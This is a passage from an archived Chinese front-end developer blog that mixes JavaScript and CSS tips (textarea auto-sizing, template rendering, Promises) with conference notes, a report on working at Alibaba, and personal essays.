    <content type="text"><![CDATA[问题：textarea数据是数据库直接输出填充，请问如何做到自适应? 回答： 123456789var tt = document.getElementsByTagName("textarea").item(0), len = tt.value.length, width = tt.clientWidth, style = (window.getComputedStyle ||function(a)&#123;return a.currentStyle&#125;)(tt, null), fs = parseInt(style['font-size']) || 12, lh = parseInt(style['line-height']) || fs * 1.2;tt.style.height = Math.ceil(len / (width / fs)) * lh + "px"; 这里需要注意的是： line-height 可能是 normal/inherit 之类的值，所以最好加上一个默认值 上面算法适合等宽字体 防止计算误差，使用 Math.ceil 函数，比较靠谱的方式是 Math.ceil(len / (width / fs) - 1)，可以少一行~ 当然，最简单的方式莫过于： 123tt.onpropertychange = tt.oninput = function()&#123; this.style.height = this.scrollHeight;&#125;; 虽然 css 也可以做到，但效果并不是很好： 12345.tt &#123; overflow-x: hide; overflow-y: visible; width: 300px;&#125; 找个有 textarea 的页面，打开控制台，输入字符，验证下吧~]]></content>
      <categories>
        <category>JavaScript</category>
        <category>前端杂烩</category>
      </categories>
      <tags>
        <tag>问答</tag>
        <tag>textarea</tag>
        <tag>自适应</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[数据交给谁来解析，前端还是后端？]]></title>
    <url>%2Fblog%2F2014%2F11%2F28%2F2014-11-28-data-compile-by-f2e-or-r2e%2F</url>
    <content type="text"><![CDATA[原文引用： 1234567891011121314151617181920212223242526272829303132333435363738394041首先，预编译跟前后端没有关系，预编译一样可以用于后端渲染。看看下面的测试时间，单位: ms模板字符串: var s = &apos;&#123;&#123;#datas&#125;&#125;&#123;&#123;name&#125;&#125; abcdefg &#123;&#123;type&#125;&#125; &#123;&#123;date&#125;&#125;&#123;&#123;/datas&#125;&#125;&apos;; 数据对象: 放入100000行数据 var stack = []; for (var i = 0; i &lt; 100000; i++) &#123; stack.push(&#123; name: &apos;name-&apos; + i, type: &apos;type-&apos; + i, date: (new Date()).toLocaleString() &#125;); &#125; var datas = &#123;datas: stack&#125;; 后端渲染:生成HTML var start = Date.now(); require(&apos;hogan&apos;).compile(s).render(datas); var end = Date.now(); console.log(end - start); // 166 ms 我的机器时间 前端渲染:我在这里做了最简单的设定，只把datas转化成字符串 var start = Date.now(); JSON.stringify(datas); var end = Date.now(); console.log(end - start); // 450 ms 我的机器时间 结果对比一目了然，你可以把这个测试用其他模板引擎测试一下。服务器为了前端渲染，对对象的字符串化所消耗的时间，远远大于 服务器直接渲染模板生成HTML所花费的时间。 这个问题的焦点并不在“放在哪里渲染快”，如果你要考虑这个效率问题，那是不是也得同时思考下： 后端渲染完了之后，需要进行网络传输的体积大了，带来的网络损耗和网络传输时间问题 很多场景，尤其是在移动端，我们通常不会把渲染工作交给后端，一方面后端渲染需要时间，一方面庞大的渲染数据传输也有时延，所以就会出现白屏问题。Bigpipe可以一定程度上处理这个问题，不过构架成本略高，用的人偏少。若把数据交给前端渲染，也存在一定的弊端，比如需求发生变化之后，接口需要调整，前端模板的解析也要跟着一起变化，这样隔着一层接口开发，办事效率就低了很多，因为我们至少要跟开发同学交涉。 nodejs 的出现让模板复用方便了不少，很多时候，让后端渲染一部分（比如首屏部分），后面的工作就交给前端异步去处理。两者结合起来效果才是最佳的。 SEO问题嘛，看产品需求，很多产品优化了 SEO 也没多大作用，如果实在要考虑： 可以使用 pjax / quickling / hash bang 等技术 服务器端根据 UA 输出内容]]></content>
      <categories>
        <category>JavaScript</category>
        <category>前端杂烩</category>
        <category>网络交互</category>
      </categories>
      <tags>
        <tag>模板渲染</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[擦肩而过的都是过眼云烟]]></title>
    <url>%2Fblog%2F2014%2F11%2F18%2F2014-11-18-%E6%93%A6%E8%82%A9%E8%80%8C%E8%BF%87%E7%9A%84%E9%83%BD%E6%98%AF%E8%BF%87%E7%9C%BC%E4%BA%91%E7%83%9F%2F</url>
    <content type="text"><![CDATA[。。。。]]></content>
  </entry>
  <entry>
    <title><![CDATA[让身体残疾的人可以访问Web]]></title>
    <url>%2Fblog%2F2014%2F11%2F17%2F2014-11-17-web-accessibility%2F</url>
    <content type="text"><![CDATA[Web accessibility means that people with disabilities can use the Web.让身体残疾的人可以访问Web，这就是 Web Accessibility。 在中国，有数以百万甚至千万计的人无法正常地使用网络，不是因为他们脑子不好使，也不是因为他们没钱没文化，而是他们用来感知这个世界的能力受到了先天或者后天的破坏。WAI（Web Accessibility inititive）这个议题在1997年五月份被提上议案，至今已经形成了一个庞大的知识体系。 残疾人士包括：失明和低视力、失聪和重听、学习障碍、认知障碍、行动不便、言语残疾、光过敏患者和这些病症的复合患者。涉及类别包括：视觉、听觉、身体、语言、认知、语言、学习以及神经残疾。 事实上，网页无障碍化，其对象不限于残疾人士。如果哪一天你打球手骨折了，你可以感受下无障碍给你带来的便利；如果哪一天你也两鬓霜白，眼力退化、听力退化，网页无障碍化技术就是你的第二双眼睛、第二双耳朵… 后期我会投入一定的时间研究并推动相关内容。]]></content>
      <categories>
        <category>前端杂烩</category>
        <category>网页无障碍</category>
      </categories>
      <tags>
        <tag>WAI</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[去掉IE11中input右侧的关闭叉叉]]></title>
    <url>%2Fblog%2F2014%2F11%2F17%2F2014-11-17-input-close-btn-in-ie11%2F</url>
    <content type="text"><![CDATA[在 IE11 下，浏览器自作多情在 text input 组件上加一个 close 叉叉： 这么整： input::-ms-clear { display: none; } 这种伪元素类似于 web component.]]></content>
      <categories>
        <category>前端杂烩</category>
      </categories>
      <tags>
        <tag>CSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[谈谈D2]]></title>
    <url>%2Fblog%2F2014%2F11%2F01%2F2014-11-01-cb-communication-in-d2%2F</url>
    <content type="text"><![CDATA[本文为归档内容,原始地址在 博客园. 很多参与了 D2 的人还不知道 D2 是个什么东西，印象中就是很多很多前端工程师汇聚在一起，交流技术。D2 是 D2前端技术论坛的简称，英文名 Designer &lt; Developer Frontend Technology Forum。下面的介绍比较官方：D2 由「淘宝网」发起，每届由 D2 前端技术论坛组委会（下简称 D2 组委会）组织，不同公司轮流承办。D2 前端技术论坛的基本宗旨：Designer+Developer：让左右大脑相互碰撞，激起更多的火花。基于商业实践：不脱离日常工作，帮助商业取得更好的成功。开放：不会把任何想法、任何作品据为私有，一切都更开放。D2 前端技术论坛的讨论范围：互联网前端技术与产品：前端技术的应用，开发中的实际案例。前端开发的行业发展：展望整个行业的发展方向，引领前端开发最新方向。D2 前端技术论坛的最终目标：创造业内交流平台引导、规范行业发展影响前端技术发展今年的 D2 由阿里巴巴承办，参与人数有一千多人。前端盛事，群英荟萃，火花不断。谈D2，这个话题有点大了，本文主要说一说 D2 会场的气氛和分享内容的甄选角度，同时也谈一谈自己对前端发展的看法。一、D2现场本届D2在上周六举办，隔了一个星期才来总结，记忆都有些淡了，不过大体的感受还是有的。与会登记人数有 1067 人，其中男性 884 人，女性 183 人，晚上酒会参加人数 118+ 人。这个规模，可以试想一下是个什么样的场面。与会者主要都是参与前端开发的工程师，也有少数还未毕业的学生。对于参与者，D2 只设了一道坎，那就是在 github 上 fork 项目，然后 pull request，提交内容中附带个人的博客地址或者微博等相关信息，方便审核者对你有一个简单的了解。我觉得这也是很有必要的。各大公司都派出了自己的代表，但更多还是自发前往杭州。在盛会上，我看到了不少群友/同学/朋友/同事，由于当日着一身中国风服饰，加上出门前自拍了一张放到网上，会场很多朋友认出了我（其实，前端圈子还是蛮小的嘛~）。所以我相信，参与了 D2 的你，也一定看到了不少往日熟悉的身影。本次 D2 有两个会场，主会场可容纳八九百人，分会场能够容纳一百多人，分会场的第一个分享被两三百人挤爆了，后续大家都默默的驻守在主会场，所以分会场后几场还是有些相对萧条的。主会场分会场酒会场引用@dh20156 的一句话：举办一场千人会议确实不容易，但只要主题明确，计划妥当，流程清晰，执行到位，还是可以愉快玩耍的! 因为刚毕业，接触前端时间也不是很长，之前对 D2 没什么了解，这也是我第一次参加 D2，真切的感受到了会场的活跃。我觉得，更重要的是，会场之后的活跃！二、分享内容的甄选下面是本届 D2 分享的内容列表，及相关 PPT 链接：《指尖上的数据》《支付宝前后端分离的思考与实践》《nodejs一小步 前端开发一大步》《Listen to the buzz of Angular.JS》《第三方开发前端实践》《企业级 NPM 服务在阿里的实践》《面向多端的蘑菇街前端技术架构》《航旅无线H5技术体系成长之路》《京东前端工业化实践之路》《淘宝前端工程与自动化体系》《透过ES6看JS未来》《架构与IBM前端 》《豆瓣的前端发展思路》具体也可以在官网上查看。事实上，本次D2总共提交了三四十个分享主题，上述这些主题都是经过前端资深专家的慎重思考和筛选之后确定的。从分享的标题中，我们可以提炼出这些字眼：数据、架构、体系、实践、发展、nodejs、工程。很显然，前端开发已经告别了刀根火种的猿人时代，对前端技术的讨论方向并未局限在某个知识点上，更多的是工程化实践和自动化系统的构建，这也是各大互联网公司发展起来后一个必然的趋势。Nodejs 的出现为前端工程师在服务器端开辟了一块领域，有人说我们抢了后端同学的饭碗。并非如此，Nodejs 作为一个中间层出现在前后端之间，厘清了各端之间的职责，为web发展提供了更加清晰的思路，这一点毋庸置疑。但是这次没听到@响马大叔 的 fibjs 分享，还是有些遗憾。各大公司为了抢占市场份额，业务方向也是由点及面的扩散，业务增多不能单靠增加工程师的数量来跟上业务需求，只能让技术跟上时代的脚步。会场是有姑娘的，找姑娘交流技术也是本次参加 D2 的一个重要使命，所以请原谅我不能为大家一一分享上述每个主题的细节内容。认认真真听进去的只有百度FEX的张可竞分享的《指尖上的数据》。主题很文艺，内容也是很贴切，下面就简单复述下介绍的内容，并谈谈自己的感受。移动互联网的迅速崛起，让前端工程师们有点猝不及防。在移动设备上，人们通过手指的触摸来了解这个大千世界，张可竞从手指触摸的细节和数据在移动终端呈现的形态上着手，做了深入的分析，最后回到技术上，他提到了这么几个点：设备的适配问题手机的性能问题技术框架…这些都是移动开发中的疼点，也是值得每一个开发者去探究的问题。去年我给老外做过一次外包，在设计上就已经很明显的感觉到国内外移动互联网技术差异，其实技术都在那里，只是国内的技术潮流还在婴幼儿阶段跃跃欲试，含苞待放。三、我对前端发展的看法很多人对 ECMAScript 6 持消极态度，说把 JavaScript 搞的太复杂了，越来越像 Ruby/Python/Java 了，一门语言的丰富，不仅仅是对语言本身的拓展，这些内容取决于市场的需求。而且本次 D2 讨论的话题是不是和 ES6 引入了模块化、异步编程等相关内容十分契合呢！HTML5规范历时8年，也在近期宣布制定完成。如今的 web 发展步入了一个平稳阶段，我认为后续我们需要思考的，包含如下问题：信息安全问题实时通讯问题应用开发问题….四、小结最后还是一如既往地做个小结，三个点。1. 移动端内容过少移动互联网技术是个重要的议题，据我所知，目前阿里很大一部分的流量来自于移动终端。而本次重点对移动端技术的介绍偏少。希望下次 D2 能够有些拓展！2. 听分享不是重点过来听分享会不是重点。分享效果取决于分享者的演讲能力以及他们对分享内容研究的深度。而二者兼备的人并不多，加上受众并不全是资深的工程师，很多内容是难以一时消化的。前端峰会的目的，前面也说了：创造业内交流平台，引导、规范行业发展，影响前端技术发展。我觉得，最实际的意义是多认识几个人，以后遇到问题多几个人可以一起探讨、交流。3. 无障碍体验区除了几个会场，还有一些分区，其中一个叫做『无障碍体验』，现代人都讲求”民主”、”平等”，技术上也是一样，我们应该更多地关注社会弱势群体。目前阿里巴巴建立了无障碍兴趣小组，我们会在业余时间针对阿里巴巴页面做一些信息无障碍的优化以及推广，也希望更多公司加入进来，提高产品易用性，让信息无障碍深入人心。最后，让我们一起来期待明年的D2盛典吧！]]></content>
      <categories>
        <category>笔记本</category>
        <category>观点和感想</category>
        <category>前端杂烩</category>
      </categories>
      <tags>
        <tag>tech</tag>
        <tag>cnblogs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[我在阿里这仨月]]></title>
    <url>%2Fblog%2F2014%2F10%2F30%2F2014-10-30-cb-life-in-alibaba%2F</url>
    <content type="text"><![CDATA[本文为归档内容,原始地址在 博客园. Alibaba 试用期是三个月，转眼三个月过去了，也到了转正述职的时间。回想这三个月做过的事情，很多很杂，但还是有重点。本文谈一谈工作中遇到的各种场景，需要用到的一些前端知识，以及我对前端进阶学习的一点思考。一、漫谈刚入职不久阿里巴巴就上市了，这是件振奋人心的事情。实际上在正式入职之前，我就已经在淘宝UED实习了三个月，所以这边的工作环境和开发流程都比较熟悉了。在工作中，遇到了很多这样的场景：1. 线上 bug 处理运营：”嘿，小胡子，有客户反馈这个提交表单的页面中，上传图片预览总是失败，麻烦你跟进下这个case~”。小胡子哥：”哦，好的！” 这个时候手头可能有很多工作，但记住一个原则，线上问题的优先级是最高的，”客户第一”是阿里也是所有公司必须秉承的一个价值观理念。打开浏览器，发现我这边并没有图片上传预览失败的问题，我纳闷了良久，期间让用户尝试换浏览器、电脑，未果，最后不得不远程连接客户的电脑，查看问题。（最后定位原因为某个地区的 CDN 出了问题）2. 网站改版（前端开发流程）老大：”小胡子，以后你就负责这两条业务线了哈~”。小胡子哥：”嗯”。某天，运营：”网站上线几个新增功能，之前的流程需要优化，本次将对 xx网站改版，几哩吧啦几哩吧啦….. 小胡子啊，几哩吧啦几哩吧啦…..”。小胡子哥：”这个需求前端实现成本太高，是不是可以这样；这个地方的修改，几哩吧啦几哩吧啦…..好的！”。 一个大的需求过来，一般会经过多次评审。刚开始是产品GG和运营MM们互喷口水，喷完了PRM评审也就完了，那么这个时候一般就确定要做什么啦，然后会把前端、视觉、开发等同学都叫过去参加交互评审，交互评审敲定之后，视觉同学就回去画图啦，这个时候后端同学会去准备数据，前端同学会跟视觉MM联系紧密，形影不离。视觉稿设计完了之后，前端就正式投入开发了。刚开始会面临一个问题，前后端的接口谁来拟订？后端数据还在准备中，如果后端拟订接口，则刚开始后端需要模拟数据，此时接口地址和前端开发环境还不在一个域下，取数据存在跨域问题，如果先改成 jsonp 的接口，开发完毕再改成 json 接口，那么后续程序也需要跟着一起改动。如果前端拟订接口，则前端需要在本地 mock 数据，若开发完毕时后端数据依然没有准备好，那么联调又是一个麻烦事儿，可能后端还得模拟一次数据，这样前端后端都实现了依次数据模拟，重复工作，冗余。庆幸的是我们有数据接口拟订的工具，这个工具可以将接口信息以文档形式沉淀，并且提供了可跨域访问的 mock 数据，接口的修改也变得异常方便。好，既然有工具，那我就辛苦点吧~ 写好数据接口，交给后端同学 review，然后开始切图（做业务嘛，唉…）公司内部使用的前端框架叫做 KISSY，目前已经升级到 5.0，而使用比较多的还是 1.4.x 版本。这是个啥玩意儿呢，很多公司没有自己的框架，于是便使用 JQ 开发，这个 KISSY 也是一样的，他就是公司的 JQuery，不过框架对业务更加有亲和力，KISSY 提供了数量庞大的组件和插件，易用性很强，但学习有一定的门槛。使用 KISSY 完成业务逻辑的开发。我们会将代码发布到 CDN 上，这点我需要得瑟下，阿里的前端发布系统真是好用到了极致！因为 HTML 部分是后端管的，我们开发好 HTML/CSS/JS 之后，会将 HTML 交给后端同学，同时将静态资源 (CSS/JS/IMG) 发布到线上，图片可以直接上传，CSS和JS在本地打包之后，push 到仓库，系统会自动完成 CDN 部署，一般前端的改动在两分钟之内就能在线上见效，一天发布几十个版本毫无压力，不像某度公司，胆战心惊的排着长队发布一个小小的改动，发布的时候还担心别人抢先上线，自己又得 merge 代码（去年在百度实习情况还是这样，不知道如今改善了多少）。待后端同学也开发完毕后，我们会把测试MM叫到旁边，让她们帮着测试系统bug，这个时候也可以把运营MM叫过来一起测试，修完 bug 就可以正式上线了。所以在阿里，前端资源是提早上线的，完了后端代码才会上。上面所说皆为 PC 端的开发流程，Mobile 端还是有很大差异，这里就不细说了。3. 需求的变更小胡子哥正在得瑟顺利的完成了一个项目的开发，可是此时，运营MM跑过来说：”某个功能因为xx原因本期不能上线了，需要等到V2版本再发，需要前端协助删除xx模块。”小胡子寻思着，皱了皱眉头。运营MM含情脉脉的对视着小胡子，小胡子说：”那，好吧，改完之后需求还变么？”运营MM点了点头，然后又摇了摇头。小胡子心想：”妈蛋”。 然后继续上述流程。那些还没有出过校门的童鞋们，看到这里，你是不是对公司项目的开发有了大概的了解呢？以上的三个场景是十分常见的，但是在公司绝不仅仅只干这些事情。在这三个月里，我参与了一个前端自动化检测工具的开发，完成了前后端的改造。所用到的技术嘛，稍微列一列：websocket 实时通讯scss/less css预处理语言grunt/gulp 打包工具MVC 分离思想Promise 异步编程框架Middleware 中间件的编写Express Node的框架…涉及到的技术点，很多很多，这些只是一个项目中用到的部分内容。前端，暗藏无数杀机，如果对基础东西掌握不牢靠，你会发现别人三小时搞定的事情，到你这里就得三天，因为你一直在踩坑！二、前端进阶的思考很多优秀的前端同学，在学到一定水平之后，会感觉学到尽头了，每天愁着怎么去学习新知识，学习什么新知识。也有很多同学，学习的重点跟工作后的从事内容偏差颇大。所以我想着能不能在这方面跟大家交流一下，一起探讨。 我在微博上也提出了这样的问题。很多同学学习没有规律，今天来点这个明天来点那个，学完之后感觉自己都懂了，但没有太多的平台/工具来检测自己所学是不是到位，然后突然某一天问道，下一步我该学啥？每个人成长都有一个过程，在这个过程中，我们会经历多次蜕变。踏过前端门槛之后，下一步要想的事情是进阶，提升自己的技能。在进阶方面，我问个简单的问题：git，你熟练么？前端发布资源到 CDN 采用的就是 git，诸如 add commit diff log status tag remote push merge 等等，这些 git 常用命令，你是否都熟悉了？git 的版本管理有哪些思路，比如线上出现了 bug，你会如何处理程序，新建分支开发？在原有基础上开发？如何管理版本？等等。很多知识是需要花费大量的时间学习的，比如 backbone, JQuery源码分析, MVVM, 设计模式, HTTP协议, 响应式, 异步编程, 模块化, websocket, DOM监控, 本地储存, 浏览器渲染原理等等，平时学习的时候可以把这些关键字枚举下，然后针对每个关键字延伸学习。延伸学习的方式很简单，google 一个关键词你能看到十几篇优秀的博文，再这些博文中寻找新的关键字，直到整个大知识点得到突破。我一直都是这么学习的。三、小结好吧，叽哩咕噜又扯了一堆，阿里巴巴是个不错的公司，如果想过来的话，可以联系我哟~ 学习是件长久并且艰苦的事情，收拾好心情，先睡个好觉，明天搞起吧！]]></content>
      <categories>
        <category>笔记本</category>
        <category>观点和感想</category>
      </categories>
      <tags>
        <tag>tech</tag>
        <tag>cnblogs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[百阿，我们是怎么‘走’到一起的]]></title>
    <url>%2Fblog%2F2014%2F10%2F09%2F2014-10-09-%E7%99%BE%E9%98%BF%EF%BC%8C%E6%88%91%E4%BB%AC%E6%98%AF%E6%80%8E%E4%B9%88%E2%80%98%E8%B5%B0%E2%80%99%E5%88%B0%E4%B8%80%E8%B5%B7%E7%9A%84%2F</url>
    <content type="text"><![CDATA[百阿——百年阿里，马总说阿里要持续健康发展 102 年，刚好横跨三个世纪，这是一个十分宏伟的蓝图。 阿里巴巴是一个价值观驱动的公司，目前她俨然已经成了一个商业生态系统，为维持这个系统的良性循环，百阿成为一个不可忽视的环节。 本期百阿的班主任是一个英俊潇洒也是极富历史厚重感的安徽大哥（开始本以为他是宁波人，口音跟我一个同学蛮像的）。一堆陌生的同学，短短两天内，彼此已经颇有默契，下面来看一看，大家是如何凝聚到一起的。 游戏。一波人围成一个圈，彼此紧贴在一起，前者蹲坐在后者的腿上，我们坚持了 30s。这个游戏打破第一道防线——身体的防线，身体的零接触，让彼此之间消除陌生感。班内男女比例基本协调，班主任有意男女错开，消除了男生和女生之间的尴尬。 分组，记名字。将大圈化成小圈，减少信息量的输入，认识身边的几个人。 小组任务。小组 Logo 设计，口号构思。大家一起完成某个任务，增进组内感情。 生命圈。一张白纸上画一个圈，将圆圈分成多个扇形，一个扇形区域代表一个 7 年时间段的经历，每个人都向大家述说自己的成长的喜怒哀乐。 课外小组任务。午饭一同进餐后，闲聊一番，约好下午的讨论地点。然后凑在一起，做了很多事情，大家相互协作，深入讨论，十分带感！ 还有一些，比如把大家拉到一个交流群组，大晚上十一二点还在扯淡；三天内在园区做一件 Crazy 的事情等等。 一个小组，十几人，才两天时间就已经建立了比较有意思的连接。大家还约定了本周日去 K歌、吃饭，我想以后还会有更多的机会相处在一起！ 感谢百阿！感谢这两天陪伴在一起的小伙伴们，虽说明天就是最后一天了，但这三天相处的记忆将会永存。]]></content>
      <categories>
        <category>笔记本</category>
      </categories>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[爱是平淡的]]></title>
    <url>%2Fblog%2F2014%2F10%2F06%2F2014-10-06-%E7%88%B1%E6%98%AF%E5%B9%B3%E6%B7%A1%E7%9A%84%2F</url>
    <content type="text"><![CDATA[国庆七天假，六天已经过去了，没出门，宅在家里。今天晚上把陈道明主演的《归来》看了下。故事是这样的： 上世纪70年代初，与家人音讯隔绝多年的劳改犯陆焉识（陈道明饰），因思念心切在一次农场转迁途中逃跑回家。他的行为给怀有芭蕾舞梦想的女儿丹丹（张慧雯饰）带来巨大的压力。女儿想方设法阻止母亲冯婉瑜（巩俐饰）与父亲陆焉识相见，结果使夫妻俩近在咫尺，却只能再次相隔天涯。 冯婉瑜因为心理疾病，已经忘记了他的丈夫陆焉识的长相，但是她深爱着他。因为曾经收到一封信说他5号从大西北回来，每月5号都会去火车站等待自己的丈夫，每次都是伤心的离去。而此时，陆一直就在他身边。陆无奈，只好通过各种方式和这个不认识自己的妻子打交道，缓和妻子和女儿之间的矛盾，照顾日渐沧桑的婉瑜。 刚开始，妻子不认识他，甚至赶他出门。冯不让女儿跟自己一起住，又得了失忆症，陆很是忧愁.可一扇门挡不住真挚的爱情，后来把自己劳改时写的一箱子没送出去的信又重新一次性寄给了冯，然后每天给冯述说曾经的种种，并把自己想说的话偷偷掺进信堆里。 张艺谋导演确实是个天才导演，每个画面都把握地十分到位。故事的发展不紧不慢的娓娓道来，点到即止，恰到好处。听说陈道明是国内最贵的电视剧演员，一集得个几十上百万吧，他现在选戏也比较挑，一般的杂牌戏是请不动他的，上就一定是深远、寓意深刻的电视电影。我一直都很欣赏他。 作为父亲，包容女儿的一切，随和。作为丈夫，将全部的爱倾注在病重的妻子身上，无微不至的照顾，而令人憋心的是，在妻子的眼里他就只是个每天为自己念信的先生。但是，每个画面传递的爱意，已经足够感动每个观众。 相比现在，三四十年前的人显得更加古朴，他们涂的只是个生计，没有太多的物质欲望，这样故事流露出来的更多的是人间真情，我想张艺谋也是对这个时代充满兴趣的。 爱一个人，不一定要轰轰烈烈如梁祝化蝶成传世佳谈，平淡的爱情就像呼吸一样，很自然，很祥和，很平淡。微信上看到一个朋友传了两张照片，她说这样的桥段让自己很受感动。 可能平淡的爱就是这样。]]></content>
      <categories>
        <category>笔记本</category>
      </categories>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[不敢选择，在怕什么？]]></title>
    <url>%2Fblog%2F2014%2F10%2F04%2F2014-10-04-%E4%B8%8D%E6%95%A2%E9%80%89%E6%8B%A9%EF%BC%8C%E5%9C%A8%E6%80%95%E4%BB%80%E4%B9%88%EF%BC%9F%2F</url>
    <content type="text"><![CDATA[在这个时代，我们时刻被无数的信息环绕着，甚至连我们呼吸的空气都填满了电磁波。随着高新技术的发展，获取信息的渠道多了，获得的信息量也大了。可是，当我们面对选择的时候，却更加地畏首畏尾了。 在面对选择的时候，很多人会表现出惯性的谨慎，他会不会骗我呀，这东西是不是真的好用啊，会不会明天价格更低呢等等。说到这里，我想起很多人在代购网站上购买 iPhone，他们每天关注 iPhone 的价格，今天涨了三十，前天跌了五十，死死的盯住百位数字，就盼着它减一减二。 三分把握不出手，五分把握不出手，八分把握还在犹豫，当晃过神来的时候，最佳的机会已经在我们迟疑的那一刹那，飘向了远方。 你会诧异那些貌似比你弱的人，为什么他们更容易抓住机遇。然后就开始纳闷了，我底子比人家好，思维比人家灵活，手脚也比人家麻利，可为何上帝总是把机会留给比我“差”的人呢？ 我们总会期待在选择的前一刻，被选择的东西会有更大的增值。贪婪是人的本性，我们期望在交易的过程中，自己占据优胜的一方，所以在遇到可以选择或者可以等待的交易时，潜意识趋向于再等一等，当你按耐不住的时候突然变得十分积极，然后涌上去干上一笔。也可能是，你一直忍着，心动而行不动，最后看着那个可能美好的东西离你而去。 说到底，我们不敢选择，是因为我们没有底气。比如在购物方面，如果给你一百万，你还会犹豫牙膏是买三块五的还是三十五的么？底气从哪里来，一方面是有一个声音在鼓励你，这个底气来自最原始的你，也就是你的潜意识；还有一方面是来自物质基础，你不用考虑这些东西是否值得买，因为买不买都不影响什么。 当然，选择也和个人的知识广度有关系。一个历经沧桑的百岁老人和一个毛都没长全的楞头小子，前者在选择时思考的会更多，犹豫也会更多，当然，得到的也可能更多。但是在这个高速发展的信息时代，我们是否真的有时间去思考？ 有人说，互联网思维就是：举枪-&gt;射击-&gt;瞄准。我们没那么多时间去做好充分的准备，打完一枪再去看看是不是瞄准了，很多价值就是在胡乱开枪的时候创造出来的。 再说个有趣的选择问题。选择在男女之间也有很明显的差异，举个生活中的例子：大多数女生在买洗发水的时候，会看一看、问一问、比一比，再认真考量下，最后可能还是不买。她们在生活中已经养成了这种习惯。而男生，看到瓶子上写了“洗发水”三个字，基本就可以确定要的东西了。选择也分性别：）。 “不敢选择，在怕什么？”。 你在怕什么，能说说么？]]></content>
      <categories>
        <category>笔记本</category>
      </categories>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[我们在追求什么？]]></title>
    <url>%2Fblog%2F2014%2F10%2F02%2F2014-10-02-what-is-our-persuits%2F</url>
    <content type="text"><![CDATA[最近看阮一峰写的《如何变得有思想？》，脑中不时冒出诸多问题： 工作是为了什么？ 我们活着是为了什么？ 如何实现自己的价值？ 我有思想么？ 钱很重要么？ … 可能在你感觉前路弥漫、驻足之时，也会思考这几个问题。 有些人奋斗了很多年，突然看到一个比自己年轻三五七八岁的小伙，在自己专注的领域远胜于自己，内心不免有些淡淡的忧伤。这些都是可以理解的。为了超越自己，为了找到更好的归宿，我们费尽心机，奋力拼搏，可到了最后，发现自己的努力一文不值（或者只指一文）时，那感觉就像从万丈悬崖跌落，心里空洞了许多。 我们在追求什么？月薪3000的人在大城市漂泊，他们在寻求更安稳的生存之道，月薪3w的人在追求更好的生活。“生存之道”和“生活”，这两个词未免也显得也太抽象了，我只知道，很少会有人满足。 不知为何会思考这个话题，但随着文字洒落下来，这种思绪又渐渐弥散了…]]></content>
      <categories>
        <category>笔记本</category>
      </categories>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[细嗅Promise]]></title>
    <url>%2Fblog%2F2014%2F09%2F29%2F2014-09-29-cb-promise%2F</url>
    <content type="text"><![CDATA[本文为归档内容,原始地址在 博客园. 读完这篇文章，预计会消耗你 40 分钟的时间。Ajax 出现的时候，刮来了一阵异步之风，现在 Nodejs 火爆，又一阵异步狂风刮了过来。需求是越来越苛刻，用户对性能的要求也是越来越高，随之而来的是页面异步操作指数般增长，如果不能恰当的控制代码逻辑，我们就会陷入无穷的回调地狱中。ECMAScript 6 已经将异步操作纳入了规范，现代浏览器也内置了 Promise 对象供我们进行异步编程，那么此刻，还在等啥？赶紧学习学习 Promise 的内部原理吧！第一章 了解 Promise一、场景再现由于 javascript 的单线程性质，我们必须等待上一个事件执行完成才能处理下一步，如下： 1234567891011121314// DOM ready之后执行$(document).ready(function()&#123; // 获取模板 $.get(url, function(tpl)&#123; // 获取数据 $.get(url2, function(data)&#123; // 构建 DOMString makeHtml(tpl, data, function(str)&#123; // 插入到 DOM 中 $(obj).html(str); &#125;); &#125;); &#125;);&#125;); 为了减少首屏数据的加载，我们将一些模板和所有数据都放在服务器端，当用户操作某个按钮时，需要将模板和数据拼接起来插入到 DOM 中，这个过程还必须在 DOMReady 之后才能执行。这种情况是十分常见的，如果异步操作再多一些，整个代码的缩进让人看着很不舒服，为了优雅地处理这个问题，ECMAScript 6 引入了 Promise 的概念，目前一些现代浏览器已经支持这些新东西了！二、模型为了让代码流程更加清晰，我们假想着能够按照下面的流程来跑程序： 1new Promise(ready).then(getTpl).then(getData).then(makeHtml).resolve(); 先将要事务按照执行顺序依次 push 到事务队列中，push 完了之后再通过 resolve 函数启动整个流程。整个流程的操作模型如下： 123456789101112131415161718promise(ok).then(ok_1).then(ok_2).then(ok_3).reslove(value)------+ | | | | | | | | | +=======+ | | | | | | | | | | | | | | | +---------|----------|----------|--------→ ok() ←------+ | | | | ↓ | | | | | ↓ | +----------|----------|--------→ ok_1()| | | | ↓ | | | | ↓ | +----------|--------→ ok_2()| | | ↓ | | | ↓ | +--------→ ok_3()-----+ | | | | | ↓@ Created By Barret Lee +=======+ exit 在 resolve 之前，promise 的每一个 then 都会将回调函数压入队列，resolve 后，将 resolve 的值送给队列的第一个函数，第一个函数执行完毕后，将执行结果再送入下一个函数，依次执行完队列。一连串下来，一气呵成，没有丝毫间断。三、简单的封装如果了解 Promise，可以移步下方，看看对 Promise 的封装：Github: //github.com/barretlee/myPromiseDEMO: http://barretlee.github.io/myPromise/index.html如果还不是很了解，可以往下阅读全文，了解一二。第二章 Promise 原理一、什么是 Promise ？那么，什么是 Promise ？Promise 可以简单理解为一个事务，这个事务存在三种状态：已经完成了 resolved因为某种原因被中断了 rejected还在等待上一个事务结束 pending上文中我们举了一个栗子，获取模板和数据之后再将拼合的数据插入到 DOM 中，这里我们将整个程序分解成多个事务： 12345事务一： 获取模板 ↓事务二： 获取数据 ↓事务三： 拼合之后插入到 DOM 在事务一结束之前，也就是模板代码从服务器拉取过来之前，事务二和事务三都处于 pending 状态，他们必须等待上一个事务结束。而事务一结束之后会将自身状态标记为 resolved，并把该事务中处理的结果移交给事务二继续处理（当然，这里如果没有数据返回，事务二就不会获得上一个事务的数据），依次类推，直到最后一个事务操作结束。在事务操作的过程中，若遇到错误，比如事务一获取数据存在跨域问题，那事务就会操作失败，此时它会将自身的状态标记为 